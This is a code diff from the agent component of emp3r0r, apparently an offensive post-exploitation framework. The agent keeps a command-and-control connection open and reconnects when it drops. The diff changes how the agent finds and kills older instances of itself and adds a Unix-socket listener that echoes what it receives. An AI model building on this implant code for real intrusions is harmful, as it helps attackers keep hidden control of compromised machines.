@@ -5,6 +5,7 @@ import (
 	"fmt"
 	"io/ioutil"
 	"log"
+	"net"
 	"os"
 	"os/exec"
 	"strings"
@@ -27,31 +28,23 @@ func main() {
 		log.SetOutput(os.Stderr)
 	}
 
-	// kill any running agents
-	alive, procs := agent.IsProcAlive("emp3r0r")
-	if alive {
-		for _, proc := range procs {
-			if proc.Pid == os.Getpid() {
-				continue
+	if agent.IsAgentAlive() {
+		// if the agent's process name is not "emp3r0r"
+		alive, pid := agent.IsAgentRunningPID()
+		if alive {
+			proc, err := os.FindProcess(pid)
+			if err != nil {
+				log.Println("WTF? The agent is not running, or is it?")
 			}
-			err := proc.Kill()
+			err = proc.Kill()
 			if err != nil {
 				log.Println("Failed to kill old emp3r0r", err)
 			}
 		}
 	}
-	// if the agent's process name is not "emp3r0r"
-	alive, pid := agent.IsAgentRunning()
-	if alive {
-		proc, err := os.FindProcess(pid)
-		if err != nil {
-			log.Println("WTF? The agent is not running, or is it?")
-		}
-		err = proc.Kill()
-		if err != nil {
-			log.Println("Failed to kill old emp3r0r", err)
-		}
-	}
+
+	// start socket listener
+	go socketListen()
 
 	// daemonize
 	if *daemon {
@@ -121,4 +114,44 @@ connect:
 		log.Printf("CCMsgTun: %v, reconnecting...", err)
 	}
 	goto connect
+}
+
+// listen on a unix socket
+func socketListen() {
+	// if socket file exists
+	if agent.IsFileExist(agent.SocketName) {
+		log.Printf("%s exists, aborting socketListen", agent.SocketName)
+		return
+	}
+
+	l, err := net.Listen("unix", agent.SocketName)
+	if err != nil {
+		log.Fatal("listen error:", err)
+	}
+
+	for {
+		fd, err := l.Accept()
+		if err != nil {
+			log.Fatal("accept error:", err)
+		}
+		go server(fd)
+	}
+}
+
+// handle connections to our socket: echo whatever we get
+func server(c net.Conn) {
+	for {
+		buf := make([]byte, 512)
+		nr, err := c.Read(buf)
+		if err != nil {
+			return
+		}
+
+		data := buf[0:nr]
+		log.Println("Server got:", string(data))
+		_, err = c.Write(data)
+		if err != nil {
+			log.Printf("Write: %v", err)
+		}
+	}
 }
